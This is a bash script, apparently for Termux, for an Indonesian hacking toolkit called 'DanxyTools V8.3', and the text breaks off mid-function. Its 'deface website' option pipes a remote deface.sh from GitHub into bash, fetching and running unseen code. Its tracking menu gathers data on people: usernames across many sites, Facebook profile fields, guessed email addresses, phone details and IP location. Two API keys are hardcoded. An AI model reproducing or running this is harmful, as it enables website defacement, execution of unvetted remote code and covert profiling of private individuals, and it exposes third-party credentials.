#!/bin/bash


# Kode warna untuk teks
NC="\033[0m"
BLUE='\033[1;94m'
GREEN='\033[1;92m'
RED='\033[1;91m'
CYAN='\033[1;96m'
YELLOW='\033[1;93m'
MAGENTA='\033[1;95m'
WHITE='\033[1;97m'


color() {
  local color_code=$1
  local text=$2

  case "$color_code" in
    red)    printf "${RED}%s${NC}\n" "$text" ;;
    green)  printf "${GREEN}%s${NC}\n" "$text" ;;
    yellow) printf "${YELLOW}%s${NC}\n" "$text" ;;
    blue)   printf "${BLUE}%s${NC}\n" "$text" ;;
    magenta)printf "${MAGENTA}%s${NC}\n" "$text" ;;
    cyan)   printf "${CYAN}%s${NC}\n" "$text" ;;
    white)  printf "${WHITE}%s${NC}\n" "$text" ;;
    *)      printf "%s${NC}\n" "$text" ;; # Default: No color
  esac
}
ATAS()        { echo '┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓'; }
BAWAH()  { echo '┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ '; }

# Kode warna untuk latar belakang
BG_BLUE='\033[1;44m'
BG_GREEN='\033[1;42m'
BG_RED='\033[1;41m'
BG_CYAN='\033[1;46m'
BG_YELLOW='\033[1;43m'
BG_MAGENTA='\033[1;45m'
BG_WHITE='\033[1;47m'

R='\033[1;31m'
G='\033[1;32m'
B='\033[1;34m'
Y='\033[1;33m'
W='\033[1;37m'
D='\033[0;37m'
RESET='\033[0m'

# Kode untuk mengatur gaya teks
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'

# Kode untuk menghapus warna dan gaya
NC='\033[0m'

#WHATSAPP_CHANNEL_URL="https://whatsapp.com/channel/0029VaznZlq7z4kW00unHZ0e"
YOUTUBE_URL="https://www.youtube.com/@DanxyOfficial"
LAGU_YOUTUBE="https://youtu.be/GsQWkVCbZOs" # URL Lagu
LAPOR_TOOLS_ERROR="https://wa.me/6285741852394?text=*LAPOR TOOLS ERROR BANG*"
loading() {
trap 'tput cnorm; kill $! 2>/dev/null' EXIT  # restore cursor & kill animasi
tput civis  # sembunyikan cursor

frames=(
'[ ░░░░░░░░░░ ] 0 %  |  INITIALIZING CORE...'
'[ █░░░░░░░░░ ] 10 % |  INJECTING PAYLOAD...'
'[ ██░░░░░░░░ ] 20 % |  BYPASSING FIREWALL...'
'[ ███░░░░░░░ ] 30 % |  CRACKING HASH...'
'[ ████░░░░░░ ] 40 % |  SPREADING ROOTKIT...'
'[ █████░░░░░ ] 50 % |  EXFILTRATING DATA...'
'[ ██████░░░░ ] 60 % |  CLEANING LOGS...'
'[ ███████░░░ ] 70 % |  SPOOFING ORIGIN...'
'[ ████████░░ ] 80 % |  LOCKING BACKDOOR...'
'[ █████████░ ] 90 % |  FINALIZING...'
'[ ██████████ ] DONE |  SYSTEM READY!'
)
total=${#frames[@]}
for ((i=0;i<total;i++)); do
    printf "\r\033[32m%s\033[0m" "${frames[i]}"
    sleep 0.4
done
echo -e "\n"
tput cnorm  # tampilkan cursor lagi
}
command_exists() {
  command -v "$1" >/dev/null 2>&1
}

banner() {
  if command_exists figlet; then
    clear
    toilet -f slant   "  Loading  " --filter border | lolcat
    echo -e "            ${BG_RED}${YELLOW}SABAR CUY BENTAR DOANG KOK${NC}"
  else
  sleep 2
    clear
    echo -e "${CYAN}===== DanxyTools =====${NC}"
  fi
  #echo -e "${BLUE}"
  #echo "     ╭────────────────────────────────────╮" | lolcat
 # echo "     │    [] LOADING SABAR YHA CUY []   │" | lolcat
 # echo "     ╰────────────────────────────────────╯" | lolcat
  echo -e "${RED}" | lolcat
  sleep 1
  clear
#  loading
  clear
  if command_exists figlet; then
    toilet -f slant "DanxyTools" --filter border | lolcat
    echo -e "┃  TOOLS INI DI BUAT & DI KEMBANGKAN OLEH DANXY OFFICIAL ┃"
    BAWAH
   
  else
    echo -e "${CYAN}=====DanxyTools =====${NC}"
 #   loading | lolcat
    sleep 1
  fi
}


tangal_tahun() {
    local hour=$(date +%H)
    hour=${hour#0}            # <-- tambahkan ini
    local greeting

    if (( hour >= 5 && hour < 12 )); then
        greeting="PAGI KAK"
    elif (( hour >= 12 && hour < 15 )); then
        greeting="SIANG KAK"
    elif (( hour >= 15 && hour < 18 )); then
        greeting="SORE KAK"
    else
        greeting="MALAM KAK"
    fi

    local tgl
    if date --version >/dev/null 2>&1; then
        tgl=$(date '+%A, %d/%B/%Y')
    else
        tgl=$(date '+%A, %d/%B/%Y')
    fi

    tgl=$(sed -E \
      -e 's/Monday/SENIN/g; s/Tuesday/SELASA/g; s/Wednesday/RABU/g' \
      -e 's/Thursday/KAMIS/g; s/Friday/JUM’AT/g; s/Saturday/SABTU/g' \
      -e 's/Sunday/MINGGU/g' \
      -e 's/January/JANUARI/g; s/February/FEBRUARI/g; s/March/MARET/g' \
      -e 's/April/APRIL/g; s/May/MEI/g; s/June/JUNI/g' \
      -e 's/July/JULI/g; s/August/AGUSTUS/g; s/September/SEPTEMBER/g' \
      -e 's/October/OKTOBER/g; s/November/NOVEMBER/g; s/December/DESEMBER/g' \
      <<< "$tgl")

    echo "$greeting, $tgl"
}

klik() {
    curl -sL https://raw.githubusercontent.com/DanxyPrasetyo/Jembotbadakngakak/main/klik.mp3 | \
    play -q -t mp3 -
}

salah() {
    curl -sL https://raw.githubusercontent.com/DanxyPrasetyo/Jembotbadakngakak/main/pilihanSalah.mp3 | \
    play -q -t mp3 -
}

hello() {
    # auto-install sox jika belum ada
    if ! command -v play &>/dev/null; then
        echo -e "\033[1;33m[+] Installing sox...\033[0m"
        pkg install -y sox >/dev/null 2>&1
    fi
    echo -e "${RED}
██████╗░░█████╗░███╗░░██╗██╗░░██╗██╗░░░██╗
██╔══██╗██╔══██╗████╗░██║╚██╗██╔╝╚██╗░██╔╝
██║░░██║███████║██╔██╗██║░╚███╔╝░░╚████╔╝░
${WHITE}██║░░██║██╔══██║██║╚████║░██╔██╗░░░╚██╔╝░░
██████╔╝██║░░██║██║░╚███║██╔╝╚██╗░░░██║░░░
╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░ [ ${RED}V8.3${NC} ]" | lolcat
    local txt="HALLO BRO SELAMAT DATANG DI DANXY TOOLS V8.3"
    local delay=0.04
    local len=${#txt}

    # play sound (skip jika gagal)
    curl -sL --max-time 4 \
        https://github.com/DanxyPrasetyo/Jembotbadakngakak/raw/refs/heads/main/welcome.mp3 \
        2>/dev/null | play -q -t mp3 - &

    # type-writer effect
    for ((i=0; i<=len; i++)); do
        printf "\r\033[1;93;41m%${i}s\033[0m" "${txt:0:i}"
        sleep "$delay"
    done
    printf "\n"
}



music_player() {
  # === 1. Install sox jika belum ===
  command -v play >/dev/null || { echo "[ ∅ ] Installing sox..."; pkg install -y sox; }

  # === 2. Playlist & cache ===
  CACHE_DIR="$HOME/.music_cache"
  mkdir -p "$CACHE_DIR"

  # === 3. URL bawaan ===
  KLIK_URL="https://raw.githubusercontent.com/DanxyPrasetyo/Jembotbadakngakak/main/klik.mp3"
  SALAH_URL="https://raw.githubusercontent.com/DanxyPrasetyo/Jembotbadakngakak/main/pilihanSalah.mp3"
  CURRENT_SONG=""      # lagu yg sedang diputar

  # === 4. Helper cepat ===
  play_url() {
    local url="$1"
    local file="$CACHE_DIR/$(basename "$url")"
    [[ ! -f "$file" ]] && curl -sL "$url" -o "$file"
    play -q "$file" &
    CURRENT_SONG=$!
  }

  # === 5. Menu mini ===
  while true; do
    clear
    echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
    echo "│           🎵  DANXY MUSIC PLAYER 2025        │"
    echo "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫"
    echo "│  1) Ganti lagu (YouTube URL)                 │"
    echo "│  2) Matikan lagu                             │"
    echo "│  3) Nyalakan lagu (YouTube URL)              │"
    echo "│  4) Efek klik (built-in)                     │"
    echo "│  5) Efek salah (built-in)                    │"
    echo "│  0) Kembali                                  │"
    echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    read -p "[ ? ] Pilih: " opt

    case $opt in
      1|3)
        read -p "[ ? ] Paste YouTube URL: " url
        [[ -z "$url" ]] && continue
        [[ "$opt" == "1" ]] && { kill $CURRENT_SONG 2>/dev/null; echo "[ ✓ ] Lagu dimatikan"; }
        play_url "$url"
        echo "[ ✓ ] Lagu diputar"
        ;;
      2)
        kill $CURRENT_SONG 2>/dev/null
        echo "[ ✓ ] Lagu dimatikan"
        ;;
      4)
        play_url "$KLIK_URL"
        ;;
      5)
        play_url "$SALAH_URL"
        ;;
      0) break ;;
      *) echo "[ ! ] Pilihan salah"; sleep 1 ;;
    esac
  done
}

login_counter() {
  LOG_FILE="$HOME/.login_count.log"
  mkdir -p "$(dirname "$LOG_FILE")"

  USER_KEY="$(whoami)"
  TODAY=$(date +%F)
  TS=$(date +'%Y-%m-%d %H:%M:%S')

  # IP & lokasi singkat
  IP=$(curl -s -m 3 https://ipinfo.io/ip 2>/dev/null || echo "-")
  CITY=$(curl -s -m 3 https://ipinfo.io/city 2>/dev/null || echo "-")

  # OS & uptime
  OS=$(uname -s)
  KERNEL=$(uname -r)
  UPTIME=$(uptime -p 2>/dev/null || uptime | awk -F'up ' '{print $2}' | cut -d',' -f1)
  #########
  your_id="$(whoami)"
greeting="$(tangal_tahun)"
# lebar di dalam kedua │ = 49 karakter
g_pad=$((49 - ${#greeting} - 1))   # -1 untuk 1 spasi setelah │
g_spaces=$(printf '%*s' $((g_pad > 0 ? g_pad : 0)) '')
#########
  # hitung login
  OLD_COUNT=$(grep "^$USER_KEY|$TODAY|" "$LOG_FILE" 2>/dev/null | cut -d'|' -f3 || echo 0)
  NEW_COUNT=$(( OLD_COUNT + 1 ))
  { grep -v "^$USER_KEY|$TODAY|" "$LOG_FILE" 2>/dev/null || true; } > "$LOG_FILE.tmp"
  echo "$USER_KEY|$TODAY|$NEW_COUNT|$TS|$IP|$CITY|$OS|$KERNEL|$UPTIME" >> "$LOG_FILE.tmp"
  mv "$LOG_FILE.tmp" "$LOG_FILE"

  TOTAL_LOGIN=$(grep "^$USER_KEY|" "$LOG_FILE" | awk -F'|' '{s+=$3} END {print s+0}')

echo " ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 │              LOGIN INFORMASI ACCOUNT ANDA            │
 ├──────────────────────────────────────────────────────┤
 │ User        : $USER_KEY                                │
 │ Login hari  : $NEW_COUNT kali                                │
 │ IP          : $IP                         │
 │ Lokasi      : $CITY                                 │
 │ OS          : $OS                                  │
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 │ █████████ ███████████████  ███████████████ █████████ │
 ├──────────────────────────────────────────────────────┤
 │ ${greeting}${g_spaces}     │
 ╰──────────────────────────────────────────────────────╯
 " | lolcat
}

show_menu() {


#echo -e "                  ${BG_RED}${YELLOW} WELCOME TO ALL MENU ${NC}"
echo -e "${GREEN}
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ╭──────────────────────────────────────────────────────╮
 │                 ${YELLOW}MENU UTAMA TOOLS V8.3${NC}${GREEN}                │
 ├────────────┬─────────────────────────┬───────────────┤
 │  [  ${RED}01${GREEN}  ]  │ ${YELLOW}SUNTIK TIKTOK${GREEN}           │               │
 │  [  ${RED}02${GREEN}  ]  │ ${YELLOW}SUNTIK IG    ${GREEN}           │               │
 │  [  ${RED}03${GREEN}  ]  │ ${YELLOW}CEK PROVIDER NOMOR${GREEN}      │               │
 │  [  ${RED}04${GREEN}  ]  │ ${YELLOW}ASCII ART GENERATOR${GREEN}     │               │
 │  [  ${RED}05${GREEN}  ]  │ ${YELLOW}PERKIRAAN CUACA${GREEN}         │               │
 │  [  ${RED}06${GREEN}  ]  │ ${YELLOW}BROWSING (w3m)${GREEN}          │               │
 │  [  ${RED}07${GREEN}  ]  │ ${YELLOW}STOP MUSIK${GREEN}              │               │
 │  [  ${RED}08${GREEN}  ]  │ ${YELLOW}STATUS WEBSITE${GREEN}          │               │
 │  [  ${RED}09${GREEN}  ]  │ ${YELLOW}ALL KALKULATOR${GREEN}          │               │
 │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}DEFACE WEBSITE     ${GREEN}     │               │
 │  [  ${RED}11${GREEN}  ]  │ ${YELLOW}TRACKING IP${GREEN}             │               │
 │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}IP PRIBADI${GREEN}              │               │
 │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │               │
 │  [  ${RED}14${GREEN}  ]  │ ${YELLOW}ENCRYPSI BASH${GREEN}           │               │
 │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}PLAY MUSIK${GREEN}              │               │
 │  [  ${RED}16${GREEN}  ]  │ ${YELLOW}LACAK NAMA${GREEN}              │               │
 │  [  ${RED}17${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │               │
 │  [  ${RED}18${GREEN}  ]  │ ${YELLOW}LAPORKAN BUG  ${GREEN}          │               │
 │  [  ${RED}19${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │               │
 │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │               │
 │  [  ${RED}21${GREEN}  ]  │ ${YELLOW}MENU GHOS TRACK${GREEN}         │               │
 │  [  ${RED}22${GREEN}  ]  │ ${YELLOW}MENU SETTING TEMA${GREEN}       │               │
 │  [  ${RED}23${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │               │
 │  [  ${RED}00${GREEN}  ]  │ ${YELLOW}KELUAR${GREEN}                  │               │
 ├────────────┴─────────────────────────┴───────────────┤
 │             DANXY TOOLS V8.3 2024 - 2025             │
 ├────────────────────┬──────────────┬──────────────────┤
 │ ${YELLOW}Your ID: ${your_id}   │ ${YELLOW}YT${NC}: ${RED}DanxyBot │ TT${NC}: Qwela.38${NC}${GREEN}     │
 ╰────────────────────┴──────────────┴──────────────────╯${NC}" | lolcat
  #echo -e "${CYAN}"
  #echo "     ╭─══════════════════════════════════─╮"
  #echo "     │    [] ALL MENU DANXY TOOLS []    │"
  #echo "     ╰─══════════════════════════════════─╯"
  #echo -e "${NC}"
   echo -e "  ${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "  ${WHITE}DEVELOPER: ${BG_RED}${YELLOW}DANXY OFFICIAL✓${NC}"
}
clear
main_menu() {
  play_music
  hello
  while true; do
    klik
    banner
    login_counter
    show_menu
    printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r danxy

    case $danxy in
    01|1)
      klik
      suntik_tiktok
      kembali_ke_menu
      klik
      ;;
    02|2)
     klik
      suntik_ig
      kembali_ke_menu
      klik
      ;;
    03|3)
      klik
      cek_provider
      kembali_ke_menu
      klik
      ;;
    04|4)
      klik
      ascii_art_generator
      kembali_ke_menu
      klik
      ;;
    05|5)
      klik
      perkiraan_cuaca
      kembali_ke_menu
      klik
      ;;
    06|6)
      klik
      browse_web
      kembali_ke_menu
      klik
      ;;
    07|7) # Opsi untuk stop musik
      klik
      stop_music
      echo -e "${YELLOW}Musik dihentikan.${NC}"
      kembali_ke_menu
      klik
      ;;
    08|8)
    klik
      cek_status_website
      kembali_ke_menu
      klik
      ;;
    09|9)
    klik
      kalkulator
      kembali_ke_menu
      klik
      ;;
   10)
   klik
      deface_mod
      kembali_ke_menu
      klik
      ;;
   11)
   klik
      ip_lookup
      kembali_ke_menu
      klik
      ;;
   12)
   klik
      cek_ip_publik
      kembali_ke_menu
      klik
      ;;
   13)
   klik
      cek_kebocoran_gmail
      kembali_ke_menu
      klik
      ;;
   14)
   klik
      enkripsi_bash
      kembali_ke_menu
      klik
      ;;
   15)
   klik
      play_music
      klik
      ;;
   16)
   klik
      lacak_nama
      kembali_ke_menu
      klik
      ;;
   17)
   klik
      lacak_lokasi_nomor
      kembali_ke_menu
      klik
      ;;
   18)
   klik
      lapor_error
      kembali_ke_menu
      klik
      ;;
   19)
   klik
      menu_tracking
      klik
      ;;
   20)
   klik
      menu_Osin
      klik
      ;;
   21)
   klik
      menu_ghostrack
      klik
      ;;
   22)
     klik
      theme_switcher
      kembali_ke_menu
     klik
     ;;
   23)
   klik
      info
      kembali_ke_menu
      klik 
      ;;
    00|0)
    klik
      echo -e "${CYAN}TERIMAKASIH SUDAH MENGGUNAKAN TOOLS DANXY.${NC}" | lolcat
      klik
      stop_music # Menghentikan pemutaran musik saat keluar
      exit 0
      ;;
    *)
      echo -e "${RED}INPUT TIDAK VALID!${NC}" | lolcat
      salah
      sleep 3
      ;;
    esac
  done
}


theme_switcher() {
  CONFIG="$HOME/.danxy_theme"
  CURRENT=$(cat "$CONFIG" 2>/dev/null || echo "dark")

  clear
  echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
  echo "│          🎨  THEME SELECTOR 2025           │"
  echo "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫"
  echo "│ 1) Dark   (neon cyan)                      │"
  echo "│ 2) Light  (pastel)                         │"
  echo "│ 3) High-Contrast (bold white)              │"
  echo "│ 0) Kembali                                 │"
  echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"

  read -p "[ ? ] Pilih tema: " opt

  case $opt in
    1) echo "dark"   > "$CONFIG" ;;
    2) echo "light"  > "$CONFIG" ;;
    3) echo "hc"     > "$CONFIG" ;;
    0) return ;;
    *) echo "[ ! ] Salah pilih"; sleep 1 ;;
  esac
  echo "[ ✓ ] Tema diubah ke $(cat "$CONFIG")"
}

music_player() {
echo -e "PROSES!!"
sleep 5
}

deface_mod() {
  bash <(curl -sL "https://raw.githubusercontent.com/danxytools/Danxy/refs/heads/main/deface.sh")
}

suntik_ig() {
clear
echo -e "

░██████╗██╗░░░██╗███╗░░██╗████████╗██╗██╗░░██╗
██╔════╝██║░░░██║████╗░██║╚══██╔══╝██║██║░██╔╝
╚█████╗░██║░░░██║██╔██╗██║░░░██║░░░██║█████═╝░
░╚═══██╗██║░░░██║██║╚████║░░░██║░░░██║██╔═██╗░
██████╔╝╚██████╔╝██║░╚███║░░░██║░░░██║██║░╚██╗
╚═════╝░░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝
░██████╗░██████╗░░█████╗░███╗░░░███╗
██╔════╝░██╔══██╗██╔══██╗████╗░████║
██║░░██╗░██████╔╝███████║██╔████╔██║
██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝" | lolcat
xdg-open "https://www.famety.net/free-instagram-followers"
}


banner_big() {
  clear
  cat << "EOF"
   ________               __      ______                __  
  / ____/ /_  ____  _____/ /_    /_  __/________ ______/ /__
 / / __/ __ \/ __ \/ ___/ __/_____/ / / ___/ __ `/ ___/ //_/
/ /_/ / / / / /_/ (__  ) /_/_____/ / / /  / /_/ / /__/ ,<   
\____/_/ /_/\____/____/\__/     /_/ /_/   \__,_/\___/_/|_| 

    [ + ]  C O D E   B Y  D A N X Y  [ + ]
EOF
}
menu_ghostrack() {
    pause(){ echo -e "\n\033[1;92m[i]\033[0m Press Enter to continue..."; read -r; }

    menu(){
        banner_big
        echo -e "
      \033[1;96m╔══════════════════════════════════════════════╗\033[0m
      \033[1;96m║\033[0m  \033[1;94m01\033[0m \033[1;97mUserrecon   \033[0m\033[1;92mUsername reconnaissance\033[0m      \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m02\033[0m \033[1;97mFacedumper  \033[0m\033[1;92mDump Facebook info\033[0m           \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m03\033[0m \033[1;97mMailfinder  \033[0m\033[1;92mFind e-mail from name\033[0m        \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m04\033[0m \033[1;97mGodorker    \033[0m\033[1;92mGoogle dorking\033[0m               \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m05\033[0m \033[1;97mPhoneinfo   \033[0m\033[1;92mPhone number info\033[0m            \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m06\033[0m \033[1;97mDNSLookup   \033[0m\033[1;92mDNS lookup\033[0m                   \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m07\033[0m \033[1;97mWhoislookup \033[0m\033[1;92mWhois lookup\033[0m                 \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m08\033[0m \033[1;97mSublookup   \033[0m\033[1;92mSubnet calculator\033[0m            \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m09\033[0m \033[1;97mHostfinder  \033[0m\033[1;92mFind hostnames\033[0m               \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m10\033[0m \033[1;97mDNSfinder   \033[0m\033[1;92mShared DNS finder\033[0m            \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m11\033[0m \033[1;97mRIPlookup   \033[0m\033[1;92mReverse IP lookup\033[0m            \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m12\033[0m \033[1;97mIPlocation  \033[0m\033[1;92mIP to location\033[0m               \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m13\033[0m \033[1;97mBitlyBypass \033[0m\033[1;92mExpand short URL\033[0m             \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m14\033[0m \033[1;97mGithubLookup\033[0m\033[1;92mGitHub user info\033[0m             \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m15\033[0m \033[1;97mTempMail    \033[0m\033[1;92mDisposable mailbox\033[0m           \033[1;96m║\033[0m
      \033[1;96m╠══════════════════════════════════════════════╣\033[0m
      \033[1;96m║\033[0m  \033[1;91m00\033[0m \033[1;97mExit        \033[1;95mbye bye :(\033[0m                   \033[1;96m║\033[0m
      \033[1;96m╚══════════════════════════════════════════════╝\033[0m"
    }



# ---------- Functions ----------
userrecon() {
  local R="\033[31m" G="\033[32m" RESET="\033[0m"

  read -rp "Enter username : " user
  echo

  # ---- 60-site master list (cleaned) ----
  local sites=(
    https://facebook.com/{}
    https://instagram.com/{}
    https://twitter.com/{}
    https://youtube.com/{}
    https://vimeo.com/{}
    https://github.com/{}
    https://plus.google.com/{}
    https://pinterest.com/{}
    https://flickr.com/people/{}
    https://vk.com/{}
    https://about.me/{}
    https://disqus.com/{}
    https://bitbucket.org/{}
    https://flipboard.com/@{}
    https://medium.com/@{}
    https://hackerone.com/{}
    https://keybase.io/{}
    https://buzzfeed.com/{}
    https://slideshare.net/{}
    https://mixcloud.com/{}
    https://soundcloud.com/{}
    https://badoo.com/en/{}
    https://imgur.com/user/{}
    https://open.spotify.com/user/{}
    https://pastebin.com/u/{}
    https://wattpad.com/user/{}
    https://canva.com/{}
    https://codecademy.com/{}
    https://last.fm/user/{}
    https://blip.fm/{}
    https://dribbble.com/{}
    https://en.gravatar.com/{}
    https://foursquare.com/{}
    https://creativemarket.com/{}
    https://ello.co/{}
    https://cash.me/{}
    https://angel.co/{}
    https://500px.com/{}
    https://houzz.com/user/{}
    https://tripadvisor.com/members/{}
    https://kongregate.com/accounts/{}
    https://{}.blogspot.com
    https://{}.tumblr.com
    https://{}.wordpress.com
    https://{}.deviantart.com
    https://{}.slack.com
    https://{}.livejournal.com
    https://{}.newgrounds.com
    https://{}.hubpages.com
    https://{}.contently.com
    https://steamcommunity.com/id/{}
    https://www.wikipedia.org/wiki/User:{}
    https://www.freelancer.com/u/{}
    https://www.dailymotion.com/{}
    https://www.etsy.com/shop/{}
    https://www.scribd.com/{}
    https://www.patreon.com/{}
    https://www.behance.net/{}
    https://www.goodreads.com/{}
    https://www.gumroad.com/{}
    https://www.instructables.com/member/{}
    https://www.codementor.io/{}
    https://www.reverbnation.com/{}
    https://www.designspiration.net/{}
    https://www.bandcamp.com/{}
    https://www.colourlovers.com/love/{}
    https://www.ifttt.com/p/{}
    https://www.trakt.tv/users/{}
    https://www.okcupid.com/profile/{}
    https://www.trip.skyscanner.com/user/{}
    http://www.zone-h.org/archive/notifier={}
    https://tiktok.com/@{}
    https://linkedin.com/in/{}
  )

  for template in "${sites[@]}"; do
    local url="${template/\{\}/$user}"
    local status
    status=$(curl -s -L -o /dev/null -w "%{http_code}" --max-time 10 "$url")
    if [[ $status =~ ^2 ]]; then
      echo -e "${G}[+]${RESET} $url"
    else
      echo -e "${R}[-]${RESET} $url"
    fi
  done

  echo -e "\n${G}ENTER UNTIK KEMBALI KE MENU${RESET}"
  read -r _
}


API_HACKERTARGET="https://api.hackertarget.com/{}/?q={}"
IPINFO_API_URL="https://ipinfo.io/{}/json"
VERIPHONE_API_BASE_URL="https://api.veriphone.io/v2/verify"
REALEMAIL_API_URL="https://isitarealemail.com/api/email/validate"
GITHUB_API_URL="https://api.github.com/users/{}"
TEMPMAIL_API_URL="https://www.1secmail.com/api/v1/"
TEMPMAIL_MAILBOX_URL="https://www.1secmail.com/mailbox"

# Keys – export in your shell or change below
REALEMAIL_API_KEY="${REALEMAIL_API_CONFIG_KEY:-0c6ad1fd-f753-4628-8c0a-7968e722c6c7}"
VERIPHONE_API_KEY="${VERIPHONE_API_CONFIG_KEY:-INK824D4fh7FGY0v00QY9aUO1T75JCih}"

# -----------------------------------------------------------------------------
# 2. Generic helpers
# -----------------------------------------------------------------------------
require_jq() {
  if ! command -v jq &>/dev/null; then
    echo -e "${R}[!]${RESET} 'jq' is required but not installed." >&2
    return 1
  fi
}
pause() {
  echo -e "${G}Press ENTER to return to the menu…${RESET}"
  read -r _
}

# -----------------------------------------------------------------------------
# 3. Facebook UID dumper (graph)
# -----------------------------------------------------------------------------
facedumper() {
  require_jq || return
  read -rp "Facebook UID or username : " uid
  token="${FB_TOKEN:-}"
  [[ -z $token ]] && { echo -e "${R}[!]${RESET} export FB_TOKEN first"; return; }
  url="https://graph.facebook.com/${uid}?access_token=${token}&fields=id,name,username,birthday,email,gender,link"
  curl -s "$url" | jq .
  pause
}

# -----------------------------------------------------------------------------
# 4. E-mail permutation tester
# -----------------------------------------------------------------------------
mailfinder() {
  require_jq || return
  read -rp "Full name (First Last) : " name
  read -rp "Domain (gmail.com)    : " dom
  IFS=' ' read -r f l <<<"$name"
  for e in "${f}.${l}@${dom}" "${f}${l}@${dom}" "${f}@${dom}"; do
    res=$(curl -s "${REALEMAIL_API_URL}?email=${e}" \
               -H "Authorization: Bearer ${REALEMAIL_API_KEY}")
    [[ "$(jq -r '.status' <<<"$res")" == "valid" ]] && \
      echo -e "${G}[✓]${RESET} $e" | tee -a result_mailfinder.txt
  done
  pause
}

# -----------------------------------------------------------------------------
# 5. Google dorker (hackertarget)
# -----------------------------------------------------------------------------
godorker() {
  read -rp "Dork string : " dork
  enc=$(jq -sRr @uri <<<"$dork")
  url=$(printf "$API_HACKERTARGET" "google" "$enc")
  curl -s "$url" | tee result_godorker.txt
  pause
}

# -----------------------------------------------------------------------------
# 6. Phone-number lookup (veriphone)
# -----------------------------------------------------------------------------
phoneinfo() {
  require_jq || return
  read -rp "Phone (+628...) : " phone
  url="${VERIPHONE_API_BASE_URL}?phone=${phone}&key=${VERIPHONE_API_KEY}"
  curl -s "$url" | jq .
  pause
}

# -----------------------------------------------------------------------------
# 7. DNS / WHOIS / subnet / host / shared-dns helpers
#   – each uses the same hackertarget pattern
# -----------------------------------------------------------------------------
dnslookup() {
  read -rp "Domain : " dom
  curl -s "$(printf "$API_HACKERTARGET" "dnslookup" "$dom")"
  pause
}
whoislookup() {
  read -rp "Domain/IP : " dom
  curl -s "$(printf "$API_HACKERTARGET" "whois" "$dom")"
  pause
}
sublookup() {
  read -rp "Domain/IP : " dom
  curl -s "$(printf "$API_HACKERTARGET" "subnetcalc" "$dom")"
  pause
}
hostfinder() {
  read -rp "Domain : " dom
  curl -s "$(printf "$API_HACKERTARGET" "hostsearch" "$dom")"
  pause
}
dnsfinder() {
  read -rp "Domain : " dom
  curl -s "$(printf "$API_HACKERTARGET" "findshareddns" "$dom")"
  pause
}
riplookup() {
  read -rp "IP address : " ip
  curl -s "$(printf "$API_HACKERTARGET" "reverseiplookup" "$ip")"
  pause
}

# -----------------------------------------------------------------------------
# 8. ipinfo.io wrapper
# -----------------------------------------------------------------------------
iplocation() {
  require_jq || return
  read -rp "IP address : " ip
  curl -s "${IPINFO_API_URL/\{\}/$ip}" | jq .
  pause
}

# -----------------------------------------------------------------------------
# 9. Bitly expander (no API key needed)
# -----------------------------------------------------------------------------
bitlybypass() {
  read -rp "Short URL : " url
  long=$(curl -sI "$url" | grep -i '^location:' | cut -d' ' -f2 | tr -d '\r')
  [[ -n $long ]] && echo -e "${G}[✓]${RESET} $long" || echo -e "${R}[!]${RESET} No redirect"
  pause
}

# -----------------------------------------------------------------------------
# 10. GitHub user lookup
# -----------------------------------------------------------------------------
githublookup() {
  require_jq || return
  read -rp "GitHub username : " user
